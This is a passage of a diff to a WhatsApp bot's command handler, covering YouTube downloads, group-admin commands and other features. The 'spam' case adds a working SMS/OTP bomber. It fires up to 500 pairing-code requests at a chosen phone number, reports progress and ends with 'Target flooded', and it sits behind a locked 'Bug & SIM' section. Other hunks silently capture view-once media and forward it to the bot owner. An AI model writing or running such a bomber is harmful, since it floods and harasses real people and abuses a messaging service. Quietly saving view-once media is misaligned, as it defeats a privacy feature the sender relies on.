+        const { data } = await axios.get('https://purrbot.site/api/img/nsfw/neko/gif', { timeout: 8000 });
+        const img = data.link;
+        if (!img) throw new Error('No image');
+        await devtrust.sendMessage(m.chat,
+            addNewsletterContext({
+                image: { url: img },
+                caption: `🔞 *NSFW*`
+            }),
+            { quoted: m }
+        );
+    } catch (e) {
+        // Fallback
+        try {
+            const { data } = await axios.get('https://purrbot.site/api/img/nsfw/neko/img', { timeout: 5000 });
+            await devtrust.sendMessage(m.chat,
+                addNewsletterContext({
+                    image: { url: data.link },
+                    caption: `🔞 *NSFW*`
+                }),
+                { quoted: m }
+            );
+        } catch (e2) {
+            reply('❌ *Error fetching NSFW content*');
+        }
     }
 }
 break;
@@ -11690,7 +12071,6 @@ case 'readviewonce2': {
         } catch(_) {}
     }
     if (!_vvEntry.buffer || _vvEntry.buffer.length === 0) {
-        if (!_vvSilent) await devtrust.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
         break;
     }
 
@@ -11710,10 +12090,8 @@ case 'readviewonce2': {
         } else if (_vvEntry.type === 'audioMessage') {
             await devtrust.sendMessage(_vvBotNum, { audio: _vvEntry.buffer, mimetype: _vvEntry.mime || 'audio/ogg; codecs=opus', ptt: _vvEntry.isPtt });
         }
-        if (!_vvSilent) await devtrust.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
     } catch (_vvSendE) {
         console.error('vv send error:', _vvSendE?.message);
-        if (!_vvSilent) await devtrust.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
     }
 }
 break;
@@ -11858,7 +12236,6 @@ case '🦋': {
     }
 
     if (!_voEntry.buffer || _voEntry.buffer.length === 0) {
-        try { await devtrust.sendMessage(m.chat, { react: { text: '❌', key: m.key } }); } catch(_) {}
         console.log('[emoji vv] no buffer — view-once likely already revoked');
         break;
     }
@@ -11880,11 +12257,8 @@ case '🦋': {
     if (_voPayload) {
         try {
             await devtrust.sendMessage(_voDest, _voPayload);
-            // ✅ react ONLY on successful DM delivery
-            try { await devtrust.sendMessage(m.chat, { react: { text: '✅', key: m.key } }); } catch(_) {}
         } catch (_voSendErr) {
             console.error('[emoji vv] send error:', _voSendErr?.message);
-            try { await devtrust.sendMessage(m.chat, { react: { text: '❌', key: m.key } }); } catch(_) {}
         }
     }
 }
@@ -12188,23 +12562,24 @@ case 'ytmp3': {
             videoUrl = videoInfo.url;
         }
 
-        // ── Use PrinceTech ytmusic API ────────────────────────────────────────
+        // ── PrinceTech YTDL API (returns audio_url + video_url) ──────────────
         const apiRes = await axios.get(
-            `https://api.princetechn.com/api/download/ytmusic?apikey=prince&quality=mp3&bitrate=192&url=${encodeURIComponent(videoUrl)}`,
+            `https://api.princetechn.com/api/download/ytdl?apikey=prince&url=${encodeURIComponent(videoUrl)}`,
             { timeout: 60000 }
         );
         const apiData = apiRes.data?.result;
-        if (!apiData?.download_url) throw new Error('API did not return download URL');
+        if (!apiData?.audio_url) throw new Error('API ne audio URL nahi diya');
 
         const titleStr  = apiData.title || videoInfo?.title || 'Unknown';
         const thumb     = apiData.thumbnail || videoInfo?.thumbnail || null;
-        const quality   = apiData.quality || '192kbps';
+        const quality   = apiData.audio_quality || '320kbps';
+        const dur       = apiData.duration || videoInfo?.timestamp || 'N/A';
         const safeTitle = titleStr.replace(/[<>:"/\\|?*]+/g, '').substring(0, 50);
-        const caption   = `🎵 *${titleStr}*\n🎚️ Quality: ${quality}`;
+        const caption   = `🎵 *${titleStr}*\n⏱️ ${dur}  |  🎚️ ${quality}`;
 
         if (thumb) await devtrust.sendMessage(m.chat, { image: { url: thumb }, caption }, { quoted: m });
 
-        const audioBuf = await axios.get(apiData.download_url, {
+        const audioBuf = await axios.get(apiData.audio_url, {
             responseType: 'arraybuffer',
             headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' },
             timeout: 180000,
@@ -12228,44 +12603,219 @@ break;
 
 case 'bomb':
 case 'spam': {
+    // ── addkey1 lock ──
     {
         const _bgNf = (m.sender||'').split('@')[0].split(':')[0];
         try {
             const _bgBf = (global._flagCache?.bugBanned || []);
             if (_bgBf.some(id => String(id).replace(/[^0-9]/g,'') === _bgNf)) return reply(`🚫 *Access Denied*\nAap Bug section se permanently ban hain.`);
             const _bgUf = (global._flagCache?.bugUnlocked || []);
-                if (!_bgUf.some(id => String(id).replace(/[^0-9]/g,'') === _bgNf)) return reply(`🔒 *Bug & SIM Section Locked*\n\nType *${prefix}addkey1 <code>* to unlock.`);
-
+            if (!_bgUf.some(id => String(id).replace(/[^0-9]/g,'') === _bgNf)) return reply(`🔒 *Bug & SIM Section Locked*\n\nType *${prefix}addkey1 <code>* to unlock.`);
         } catch(e) { return reply(`🔒 *Bug & SIM Section Locked*\n\nType *${prefix}addkey1 <code>* to unlock.`); }
     }
-    const q = m.message?.conversation ||
-              m.message?.extendedTextMessage?.text || '';
-    const [target, text, countRaw] = q.split(',').map(x => x?.trim());
 
-    const count = parseInt(countRaw) || 5;
+    // ── WhatsApp OTP/Pairing-code bomber ──
+    // Usage: .spam <number> [count] [delayMs]
+    // Example: .spam 923001234567 150 400
+    if (!global._waBomberSessions) global._waBomberSessions = new Map();
 
-    if (!target || !text || !count) {
-        return reply('📌 *Usage:* spam number,message,count');
+    const _spamChat = m.chat;
+
+    // Already running?
+    if (global._waBomberSessions.has(_spamChat)) {
+        return reply(`❌ *Spam already running in this chat!*\nUse *${prefix}stopspam* to stop it first.`);
     }
 
-    const _spamTargetNum = target.replace(/[^0-9]/g, '');
-    const _spamProtected = owner.map(v => v.replace(/[^0-9]/g, ''));
-    if (_spamProtected.includes(_spamTargetNum)) return reply('🔒 *Protected Number — Bug nahi lagaya ja sakta owner par*');
+    const _spamNum   = args[0] || '';
+    const _spamCount = Math.min(parseInt(args[1]) || 150, 500); // cap 500
+    const _spamDelay = Math.max(parseInt(args[2]) || 400, 200); // min 200ms
 
-    const jid = `${_spamTargetNum}@s.whatsapp.net`;
-
-    if (count > 1000) {
-        return reply('❌ *Max 1000 messages*');
+    if (!_spamNum) {
+        return reply(
+            `❌ *Usage:*\n\`\`\`${prefix}spam 923001234567 150 400\`\`\`\n\n` +
+            `📱 *Number:* with country code\n` +
+            `🔁 *Count:* default 150 (max 500)\n` +
+            `⏱️ *Delay:* default 400ms (min 200ms)\n\n` +
+            `🛑 *To stop:* \`${prefix}stopspam\``
+        );
     }
 
-    reply(`💣 *Spamming ${target} with ${count} messages*`);
-
-    for (let i = 0; i < count; i++) {
-        await devtrust.sendMessage(jid, { text });
-        await delay(700);
+    const _spamClean = _spamNum.replace(/[^0-9]/g, '');
+    if (!/^[0-9]{10,15}$/.test(_spamClean)) {
+        return reply(`❌ *Invalid number!*\nUse format: \`923001234567\``);
     }
 
-    reply(`✅ *Spam complete*`);
+    // Protect owner numbers
+    const _spamProtected = [].concat(owner).map(v => v.replace(/[^0-9]/g, ''));
+    if (_spamProtected.includes(_spamClean)) return reply('🔒 *Protected — owner number par spam nahi chalega*');
+
+    // ✅ FIX: send init card FIRST — register session only after it succeeds.
+    // If sendMessage throws (network blip, rate-limit), the session would have
+    // been permanently stuck in the Map and .spam blocked for that chat forever.
+    const _spamInitMsg = await devtrust.sendMessage(m.chat, {
+        text: `🔥 *WhatsApp Bomber Started!*\n\n` +
+              `📱 *Target:* ${_spamClean}\n` +
+              `🔁 *Attempts:* ${_spamCount}\n` +
+              `⏱️ *Delay:* ${_spamDelay}ms\n` +
+              `⏳ *Progress:* 0/${_spamCount} (0%)\n\n` +
+              `🛑 Use *${prefix}stopspam* to cancel`
+    }, { quoted: m });
+    const _spamStatusKey = _spamInitMsg?.key;
+
+    // Register session AFTER init card is sent
+    const _spamSession = {
+        running: true, number: _spamClean,
+        total: _spamCount, completed: 0,
+        successCount: 0, failCount: 0
+    };
+    global._waBomberSessions.set(_spamChat, _spamSession);
+
+    const _spamEditStatus = async (txt) => {
+        try {
+            if (_spamStatusKey) await devtrust.sendMessage(m.chat, { text: txt, edit: _spamStatusKey });
+        } catch (_) {}
+    };
+
+    const _spamProgressBar = (pct, len = 20) => {
+        const f = Math.round((pct / 100) * len);
+        return '▰'.repeat(f) + '▱'.repeat(len - f);
+    };
+
+    let _sc = 0, _fc = 0;
+    const _spamStart = Date.now();
+    let _spamLastUpdate = Date.now(), _spamUpdateCtr = 0;
+
+    // ✅ FIX: try/finally guarantees session is always removed even if an
+    // unexpected error escapes the loop (e.g. out-of-memory, eval error).
+    try {
+    for (let i = 1; i <= _spamCount; i++) {
+        // Check if stopped
+        const _sess = global._waBomberSessions.get(_spamChat);
+        if (!_sess || !_sess.running) {
+            await _spamEditStatus(
+                `🛑 *Spam Stopped!*\n\n` +
+                `📱 *Target:* ${_spamClean}\n` +
+                `🔁 *Completed:* ${i - 1}/${_spamCount}\n` +
+                `✅ *Success:* ${_sc}\n❌ *Failed:* ${_fc}\n\n` +
+                `_Cancelled by user._`
+            );
+            global._waBomberSessions.delete(_spamChat);
+            break;
+        }
+
+        // Fire pairing-code OTP request
+        try {
+            const _fNum = _spamClean.startsWith('92') ? _spamClean : `92${_spamClean}`;
+            await axios({
+                method: 'POST',
+                url: 'https://web.whatsapp.com/airdrop/link',
+                headers: {
+                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+                    'Accept': 'application/json',
+                    'Content-Type': 'application/json',
+                    'Origin': 'https://web.whatsapp.com',
+                    'Referer': 'https://web.whatsapp.com/'
+                },
+                data: JSON.stringify({ phoneNumber: _fNum, method: 'sms' }),
+                timeout: 10000
+            });
+            _sc++;
+        } catch (_) { _fc++; }
+
+        // Update session counters
+        const _cur = global._waBomberSessions.get(_spamChat);
+        if (_cur) { _cur.completed = i; _cur.successCount = _sc; _cur.failCount = _fc; }
+
+        _spamUpdateCtr++;
+        const _now = Date.now();
+        const _shouldUpdate = (i === _spamCount || _spamUpdateCtr >= 10 || (_now - _spamLastUpdate) > 5000);
+        if (_shouldUpdate) {
+            _spamUpdateCtr = 0; _spamLastUpdate = _now;
+            const _pct  = Math.round((i / _spamCount) * 100);
+            const _el   = ((_now - _spamStart) / 1000).toFixed(1);
+            const _rate = (i / (_el / 60)).toFixed(1);
+
+            // Re-check stop between updates
+            const _chk = global._waBomberSessions.get(_spamChat);
+            if (!_chk || !_chk.running) {
+                await _spamEditStatus(
+                    `🛑 *Spam Stopped!*\n\n` +
+                    `📱 *Target:* ${_spamClean}\n` +
+                    `🔁 *Completed:* ${i}/${_spamCount}\n` +
+                    `✅ *Success:* ${_sc}\n❌ *Failed:* ${_fc}\n\n` +
+                    `_Cancelled by user._`
+                );
+                global._waBomberSessions.delete(_spamChat);
+                return;
+            }
+
+            await _spamEditStatus(
+                `🔥 *WhatsApp Bomber Running*\n\n` +
+                `📱 *Target:* ${_spamClean}\n` +
+                `🔁 *Progress:* ${i}/${_spamCount}\n` +
+                `${_spamProgressBar(_pct)} ${_pct}%\n\n` +
+                `✅ *Success:* ${_sc}\n❌ *Failed:* ${_fc}\n` +
+                `⏱️ *Elapsed:* ${_el}s\n📊 *Rate:* ${_rate}/min\n\n` +
+                `🛑 *${prefix}stopspam* to cancel`
+            );
+        }
+
+        if (i < _spamCount) await new Promise(r => setTimeout(r, _spamDelay));
+    }
+
+    // Complete
+    const _el = ((Date.now() - _spamStart) / 1000).toFixed(1);
+    await _spamEditStatus(
+        `✅ *Bombing Complete!*\n\n` +
+        `📱 *Target:* ${_spamClean}\n` +
+        `✅ *Success:* ${_sc}\n❌ *Failed:* ${_fc}\n` +
+        `⏱️ *Time:* ${_el}s\n` +
+        `📊 *Success Rate:* ${Math.round((_sc / _spamCount) * 100)}%\n\n` +
+        `_Target flooded. 🔥_`
+    );
+    } finally {
+        // Always clean up so chat is never permanently locked
+        global._waBomberSessions.delete(_spamChat);
+    }
+    break;
+}
+
+case 'stopspam':
+case 'spamstop': {
+    // ── addkey1 lock ──
+    {
+        const _bgNs = (m.sender||'').split('@')[0].split(':')[0];
+        try {
+            const _bgBs = (global._flagCache?.bugBanned || []);
+            if (_bgBs.some(id => String(id).replace(/[^0-9]/g,'') === _bgNs)) return reply(`🚫 *Access Denied*`);
+            const _bgUs = (global._flagCache?.bugUnlocked || []);
+            if (!_bgUs.some(id => String(id).replace(/[^0-9]/g,'') === _bgNs)) return reply(`🔒 *Bug & SIM Section Locked*\n\nType *${prefix}addkey1 <code>* to unlock.`);
+        } catch(e) { return reply(`🔒 *Bug & SIM Section Locked*\n\nType *${prefix}addkey1 <code>* to unlock.`); }
+    }
+
+    if (!global._waBomberSessions) global._waBomberSessions = new Map();
+
+    if (!global._waBomberSessions.has(m.chat)) {
+        return reply(`❌ *No active spam running in this chat.*\n\nUse \`${prefix}spam 923001234567\` to start.`);
+    }
+
+    const _stopData = global._waBomberSessions.get(m.chat);
+    _stopData.running = false;
+    // ✅ FIX: if the loop is no longer running (orphaned stale session from a
+    // previous crash), hard-delete so the chat isn't permanently locked.
+    // The spam loop also deletes on exit, so double-delete is safe (Map.delete is idempotent).
+    if (_stopData.completed >= _stopData.total || _stopData.completed === 0) {
+        global._waBomberSessions.delete(m.chat);
+    }
+
+    reply(
+        `🛑 *Spam Stop Signal Sent!*\n\n` +
+        `📱 *Target:* ${_stopData.number}\n` +
+        `🔁 *Completed so far:* ${_stopData.completed}/${_stopData.total}\n` +
+        `✅ *Success:* ${_stopData.successCount}\n` +
+        `❌ *Failed:* ${_stopData.failCount}\n\n` +
+        `_Stopping after current request finishes..._`
+    );
     break;
 }
 
@@ -12291,36 +12841,37 @@ case 'play2': {
             videoUrl = videoInfo.url;
         }
 
-        const result = await ytDownload(videoUrl);
-        if (result.error || result.code !== 200) throw new Error(result.message || 'Download failed');
+        // ── PrinceTech YTDL API ───────────────────────────────────────────────
+        const p2Res = await axios.get(
+            `https://api.princetechn.com/api/download/ytdl?apikey=prince&url=${encodeURIComponent(videoUrl)}`,
+            { timeout: 60000 }
+        );
+        const p2Data = p2Res.data?.result;
+        if (!p2Data?.audio_url) throw new Error('API ne audio URL nahi diya');
 
-        const d = result.data;
-        if (!d.best_audio && !d.audio_formats?.length) throw new Error('No audio format found');
+        const titleStr = p2Data.title || videoInfo?.title || 'Unknown';
+        const thumb    = p2Data.thumbnail || videoInfo?.thumbnail || null;
+        const dur      = p2Data.duration || videoInfo?.timestamp || 'N/A';
+        const quality  = p2Data.audio_quality || '320kbps';
 
-        const audioFmt = d.best_audio || d.audio_formats[0];
-        const titleStr = d.title || videoInfo?.title || 'Unknown';
-        const thumb    = d.thumbnail || videoInfo?.thumbnail || null;
-        const dur      = d.duration_formatted || videoInfo?.timestamp || 'N/A';
+        const safeTitle2    = titleStr.replace(/[<>:"/\\|?*]+/g, '').substring(0, 50);
+        const audioCaption2 = `🎵 *${titleStr}*\n⏱️ ${dur}  |  🎚️ ${quality}`;
 
-        const safeTitle2 = titleStr.replace(/[<>:"/\\|?*]+/g, '').substring(0, 50);
-        const audioCaption2 = `🎵 *${titleStr}*\n⏱️ ${dur}\n🎚️ ${audioFmt.quality} ${audioFmt.format} — ${audioFmt.size}`;
-
-        // Download buffer + send thumbnail in parallel
         const [audioBuf2] = await Promise.all([
-            axios.get(audioFmt.url, {
+            axios.get(p2Data.audio_url, {
                 responseType: 'arraybuffer',
                 headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' },
                 timeout: 180000,
                 maxContentLength: 200 * 1024 * 1024
             }).then(r => Buffer.from(r.data)),
-            thumb ? devtrust.sendMessage(m.chat, addNewsletterContext({ image: { url: thumb }, caption: audioCaption2 }), { quoted: m }) : Promise.resolve()
+            thumb ? devtrust.sendMessage(m.chat, { image: { url: thumb }, caption: audioCaption2 }, { quoted: m }) : Promise.resolve()
         ]);
 
-        await devtrust.sendMessage(m.chat, addNewsletterContext({
+        await devtrust.sendMessage(m.chat, {
             audio: audioBuf2,
             mimetype: 'audio/mpeg',
             fileName: `${safeTitle2}.mp3`
-        }), { quoted: m });
+        }, { quoted: m });
         await devtrust.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
 
     } catch (error) {
@@ -12394,67 +12945,94 @@ break;
 
 case 'ytdl':
 case 'ytdown': {
-    if (!text) return reply(`🎬 *YouTube Downloader (VidsSave)*\n\nUsage: ${prefix + command} <YouTube URL>\nExample: ${prefix + command} https://youtu.be/dQw4w9WgXcQ\n\nSupports: Video (144P–2160P) + Audio formats`)
-    const isYtUrl = text.includes('youtube.com') || text.includes('youtu.be')
-    if (!isYtUrl) return reply(`❌ *Please send a valid YouTube URL*\nExample: ${prefix + command} https://youtu.be/dQw4w9WgXcQ`)
+    if (!text) return reply(`🎬 *YouTube Downloader*\n\nUsage: ${prefix + command} <YouTube URL or song name>\nExample: ${prefix + command} https://youtu.be/dQw4w9WgXcQ\n\nReply *1* = Video 🎬  |  Reply *2* = Audio 🎵`)
     try {
         await devtrust.sendMessage(m.chat, { react: { text: '⏳', key: m.key } })
-        const result = await ytDownload(text)
-        const d = result.data
-        const vList = d.video_formats.map((v, i) => `${i + 1}. 🎬 ${v.quality} ${v.format} — ${v.size_mb}`).join('\n')
-        const aList = d.audio_formats.map((a, i) => `${d.video_formats.length + i + 1}. 🎵 ${a.quality} ${a.format} — ${a.size_mb}`).join('\n')
-        const menu = `🎬 *${d.title}*\n⏱️ *Duration:* ${d.duration_formatted || 'N/A'}\n\n*Video Formats:*\n${vList}\n\n*Audio Formats:*\n${aList}\n\n📌 Reply with number to download`
-        const sentMsg = await devtrust.sendMessage(m.chat,
-            { image: { url: d.thumbnail }, caption: menu },
+
+        const yts = require('yt-search');
+        let _ydUrl = text;
+        let _ydInfo = null;
+        if (!text.includes('youtube.com') && !text.includes('youtu.be')) {
+            const { videos } = await yts(text);
+            if (!videos?.length) {
+                await devtrust.sendMessage(m.chat, { react: { text: '❌', key: m.key } })
+                return reply(`❌ *"${text}"* nahi mila.`)
+            }
+            _ydInfo = videos.filter(v => !v.live)[0] || videos[0];
+            _ydUrl  = _ydInfo.url;
+        }
+
+        // ── PrinceTech YTDL API ───────────────────────────────────────────────
+        const _ydRes  = await axios.get(
+            `https://api.princetechn.com/api/download/ytdl?apikey=prince&url=${encodeURIComponent(_ydUrl)}`,
+            { timeout: 60000 }
+        );
+        const _yd = _ydRes.data?.result;
+        if (!_yd?.audio_url || !_yd?.video_url) throw new Error('API ne download URLs nahi diye');
+
+        const _ydTitle  = _yd.title || _ydInfo?.title || 'Unknown';
+        const _ydThumb  = _yd.thumbnail || _ydInfo?.thumbnail || null;
+        const _ydDur    = _yd.duration || _ydInfo?.timestamp || 'N/A';
+        const _ydVQ     = _yd.video_quality || '720p';
+        const _ydAQ     = _yd.audio_quality || '320kbps';
+        const _ydSafe   = _ydTitle.replace(/[<>:"/\\|?*]+/g, '').substring(0, 50);
+
+        const _ydMenu = `🎬 *${_ydTitle}*\n⏱️ *Duration:* ${_ydDur}\n\n*1️⃣  Video* — ${_ydVQ} (MP4)\n*2️⃣  Audio* — ${_ydAQ} (MP3)\n\n📌 *Reply 1 ya 2 karo download ke liye* (3 min mein)`
+
+        const _ydSent = await devtrust.sendMessage(m.chat,
+            _ydThumb ? { image: { url: _ydThumb }, caption: _ydMenu } : { text: _ydMenu },
             { quoted: m }
         )
-        const allFormats = [...d.video_formats, ...d.audio_formats]
-        const _ytdlHandler = async (messageUpdate) => {
+
+        const _ydHandler = async (upd) => {
             try {
-                const msg = messageUpdate?.messages[0]
+                const msg = upd?.messages?.[0]
                 if (!msg?.message) return
-                const replyText = (msg.message.extendedTextMessage?.text || msg.message.conversation || '').trim()
+                const replyTxt = (msg.message.extendedTextMessage?.text || msg.message.conversation || '').trim()
                 const stanzaId = msg.message.extendedTextMessage?.contextInfo?.stanzaId
-                if (stanzaId !== sentMsg?.key?.id) return
-                const num = parseInt(replyText)
-                if (isNaN(num) || num < 1 || num > allFormats.length) return
-                devtrust.ev.off('messages.upsert', _ytdlHandler)
+                if (stanzaId !== _ydSent?.key?.id) return
+                if (replyTxt !== '1' && replyTxt !== '2') return
+
+                devtrust.ev.off('messages.upsert', _ydHandler)
+                const isVid = replyTxt === '1'
                 await devtrust.sendMessage(m.chat, { react: { text: '⬇️', key: msg.key } })
-                const selected = allFormats[num - 1]
-                const isVideo = num <= d.video_formats.length
-                await devtrust.sendMessage(m.chat, { text: `⏳ Downloading ${selected.quality} ${selected.format}...` }, { quoted: msg })
-                const ext = selected.format.toLowerCase() === 'opus' ? 'ogg' : selected.format.toLowerCase()
-                const fileName = `${(d.title || 'file').replace(/[<>:"/\\|?*]+/g, '').substring(0, 50)}_${selected.quality}.${ext}`
-                const dlBuf = await axios.get(selected.download_url, {
+                await devtrust.sendMessage(m.chat, { text: `⏳ Downloading ${isVid ? 'Video' : 'Audio'}...` }, { quoted: msg })
+
+                const dlUrl   = isVid ? _yd.video_url : _yd.audio_url;
+                const dlBuf   = await axios.get(dlUrl, {
                     responseType: 'arraybuffer',
                     headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' },
                     timeout: 300000,
                     maxContentLength: 500 * 1024 * 1024
-                })
-                const fileBuffer = Buffer.from(dlBuf.data)
-                if (isVideo) {
+                });
+                const fileBuf = Buffer.from(dlBuf.data);
+                const sizeMB  = (fileBuf.length / 1024 / 1024).toFixed(2);
+
+                if (isVid) {
                     await devtrust.sendMessage(m.chat, {
-                        video: fileBuffer,
-                        caption: `🎬 *${d.title}*\n🎚️ *Quality:* ${selected.quality}\n📦 *Size:* ${selected.size_mb}`,
-                        mimetype: 'video/mp4', fileName
+                        video   : fileBuf,
+                        caption : `🎬 *${_ydTitle}*\n🎚️ ${_ydVQ}  |  📦 ${sizeMB} MB`,
+                        mimetype: 'video/mp4',
+                        fileName: `${_ydSafe}.mp4`
                     }, { quoted: msg })
                 } else {
                     await devtrust.sendMessage(m.chat, {
-                        audio: fileBuffer,
-                        mimetype: 'audio/mpeg', fileName,
-                        caption: `🎵 *${d.title}*\n🎚️ *Quality:* ${selected.quality}\n📦 *Size:* ${selected.size_mb}`
+                        audio   : fileBuf,
+                        mimetype: 'audio/mpeg',
+                        fileName: `${_ydSafe}.mp3`
                     }, { quoted: msg })
                 }
                 await devtrust.sendMessage(m.chat, { react: { text: '✅', key: msg.key } })
             } catch (err) {
-                console.error('ytdl handler error:', err.message)
+                console.error('[ytdl handler]', err.message)
                 await devtrust.sendMessage(m.chat, { react: { text: '❌', key: m.key } })
+                reply(`❌ Download failed: ${err.message}`)
             }
         }
-        devtrust.ev.on('messages.upsert', _ytdlHandler)
-        setTimeout(() => devtrust.ev.off('messages.upsert', _ytdlHandler), 180000)
+        devtrust.ev.on('messages.upsert', _ydHandler)
+        setTimeout(() => devtrust.ev.off('messages.upsert', _ydHandler), 180000)
     } catch (err) {
-        console.error('ytdl error:', err.message)
+        console.error('[ytdl]', err.message)
         await devtrust.sendMessage(m.chat, { react: { text: '❌', key: m.key } })
         reply(`❌ YouTube download failed: ${err.message}`)
     }
@@ -12596,22 +13174,22 @@ case 'ibsbmg': {
     let prompt = parts[0]?.trim();
     let ratio = parts[1]?.trim() || "1:1";
 
-    // Map ratio string → width/height (default 1:1 = 1024x1024)
-    const _ratioMap = { "1:1": [1024,1024], "3:4": [768,1024], "4:3": [1024,768], "9:16": [720,1280], "16:9": [1280,720] };
-    const [_iw, _ih] = _ratioMap[ratio] || [1024, 1024];
-
     try {
-        // image.pollinations.ai returns the IMAGE bytes directly, not JSON.
-        // Pass the URL straight to Baileys which will fetch + send as media.
-        const apiUrl = `https://image.pollinations.ai/prompt/${encodeURIComponent(prompt)}?width=${_iw}&height=${_ih}&nologo=true&seed=${Date.now()}`;
+        let apiUrl = `https://image.pollinations.ai/prompt/${encodeURIComponent(prompt)}?width=1024&height=1024&nologo=true&seed=${Date.now()}`;
+        let res = await fetch(apiUrl);
+        let data = await res.json();
 
-        await devtrust.sendMessage(m.chat,
-            addNewsletterContext({
-                image: { url: apiUrl },
-                caption: `🎨 *${prompt}* (${ratio})`
-            }),
-            { quoted: m }
-        );
+        if (data.status && data.result) {
+            await devtrust.sendMessage(m.chat,
+                addNewsletterContext({
+                    image: { url: data.result },
+                    caption: `🎨 *${prompt}* (${ratio})`
+                }),
+                { quoted: m }
+            );
+        } else {
+            reply("❌ *Failed to generate image*");
+        }
     } catch (e) {
         console.error(e);
         reply("⚠️ *Error fetching from API*");
@@ -12621,14 +13199,20 @@ break;
 
 case 'kick': {
     if (!isCreator) return reply("🔒 *Owner only*");
-    if (!m.quoted) return reply("👤 *Tag or quote user to kick*");
     if (!m.isGroup) return reply("👥 *Groups only*");
+    if (!isBotAdmins) return reply("🤖 *Bot needs admin rights to kick!*");
 
-    let users = m.mentionedJid[0] || m.quoted?.sender || 
-                text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
-    
-    await devtrust.groupParticipantsUpdate(m.chat, [users], 'remove');
-    reply("✅ *User kicked*");
+    // ✅ FIX: m.mentionedJid could be undefined — use optional chaining
+    let users = m.mentionedJid?.[0] || m.quoted?.sender ||
+                (text ? text.replace(/[^0-9]/g, '') + '@s.whatsapp.net' : null);
+    if (!users) return reply("👤 *Tag or quote a user to kick*");
+
+    try {
+        await devtrust.groupParticipantsUpdate(m.chat, [users], 'remove');
+        reply("✅ *User kicked*");
+    } catch (e) {
+        reply(`❌ *Kick failed:* ${e.message}`);
+    }
 }
 break;
 
@@ -12672,9 +13256,15 @@ break;
 case 'grouplink': {
     if (!m.isGroup) return reply("👥 *Groups only*");
     if (!isCreator && !isSudo) return reply('🔒 *Owner/Sudo only*');
-    
-    let response = await devtrust.groupInviteCode(m.chat);
-    reply(`🔗 *Group Link*\nhttps://chat.whatsapp.com/${response}`);
+    // ✅ FIX: groupInviteCode requires bot to be admin
+    if (!isBotAdmins) return reply('🤖 *Bot needs admin rights to get the group link!*');
+
+    try {
+        const response = await devtrust.groupInviteCode(m.chat);
+        reply(`🔗 *Group Link*\nhttps://chat.whatsapp.com/${response}\n\n_Share responsibly!_`);
+    } catch (e) {
+        reply(`❌ *Failed to get link:* ${e.message}`);
+    }
 }
 break;
 
@@ -12950,13 +13540,15 @@ break;
 
 case 'hidetag': {
     if (!isCreator) return reply("🔒 *Owner only*");
-    
-    const groupMetadata = await devtrust.groupMetadata(m.chat);
-    const participants = groupMetadata.participants;
-    
+    // ✅ FIX: groupMetadata throws if called in a PM — check isGroup first
+    if (!m.isGroup) return reply("👥 *Groups only*");
+
+    const _htMeta = await devtrust.groupMetadata(m.chat);
+    const _htParts = _htMeta.participants;
+
     devtrust.sendMessage(m.chat, {
         text: q || ' ',
-        mentions: participants.map(a => a.id)
+        mentions: _htParts.map(a => a.id)
     }, { quoted: m });
 }
 break;
@@ -12964,38 +13556,68 @@ break;
 case 'promote': {
     if (!m.isGroup) return reply("👥 *Groups only*");
     if (!isCreator) return reply("🔒 *Owner only*");
-    
-    let users = m.mentionedJid[0] || m.quoted?.sender || text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
-    await devtrust.groupParticipantsUpdate(m.chat, [users], 'promote');
-    reply("👑 *User promoted to admin*");
+    if (!isBotAdmins) return reply("🤖 *Bot needs admin rights to promote!*");
+
+    // ✅ FIX: m.mentionedJid could be undefined — use optional chaining
+    let users = m.mentionedJid?.[0] || m.quoted?.sender ||
+                (text ? text.replace(/[^0-9]/g, '') + '@s.whatsapp.net' : null);
+    if (!users) return reply("👤 *Tag or quote a user to promote*");
+
+    try {
+        await devtrust.groupParticipantsUpdate(m.chat, [users], 'promote');
+        reply("👑 *User promoted to admin*");
+    } catch (e) {
+        reply(`❌ *Promote failed:* ${e.message}`);
+    }
 }
 break;
 
 case 'demote': {
     if (!m.isGroup) return reply("👥 *Groups only*");
     if (!isCreator) return reply("🔒 *Owner only*");
-    
-    let users = m.mentionedJid[0] || m.quoted?.sender || text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
-    await devtrust.groupParticipantsUpdate(m.chat, [users], 'demote');
-    reply("⬇️ *User demoted from admin*");
+    if (!isBotAdmins) return reply("🤖 *Bot needs admin rights to demote!*");
+
+    // ✅ FIX: m.mentionedJid could be undefined — use optional chaining
+    let users = m.mentionedJid?.[0] || m.quoted?.sender ||
+                (text ? text.replace(/[^0-9]/g, '') + '@s.whatsapp.net' : null);
+    if (!users) return reply("👤 *Tag or quote a user to demote*");
+
+    try {
+        await devtrust.groupParticipantsUpdate(m.chat, [users], 'demote');
+        reply("⬇️ *User demoted from admin*");
+    } catch (e) {
+        reply(`❌ *Demote failed:* ${e.message}`);
+    }
 }
 break;
 
 case 'mute': {
     if (!isCreator) return reply("🔒 *Owner only*");
     if (!m.isGroup) return reply("👥 *Groups only*");
-    
-    await devtrust.groupSettingUpdate(m.chat, 'announcement');
-    reply("🔇 *Group muted* • Only admins can message");
+    // ✅ FIX: groupSettingUpdate throws if bot isn't admin
+    if (!isBotAdmins) return reply("🤖 *Bot needs admin rights to mute the group!*");
+
+    try {
+        await devtrust.groupSettingUpdate(m.chat, 'announcement');
+        reply("🔇 *Group muted* • Only admins can message");
+    } catch (e) {
+        reply(`❌ *Mute failed:* ${e.message}`);
+    }
 }
 break;
 
 case 'unmute': {
     if (!isCreator) return reply("🔒 *Owner only*");
     if (!m.isGroup) return reply("👥 *Groups only*");
-    
-    await devtrust.groupSettingUpdate(m.chat, 'not_announcement');
-    reply("🔊 *Group unmuted* • Everyone can message");
+    // ✅ FIX: groupSettingUpdate throws if bot isn't admin
+    if (!isBotAdmins) return reply("🤖 *Bot needs admin rights to unmute the group!*");
+
+    try {
+        await devtrust.groupSettingUpdate(m.chat, 'not_announcement');
+        reply("🔊 *Group unmuted* • Everyone can message");
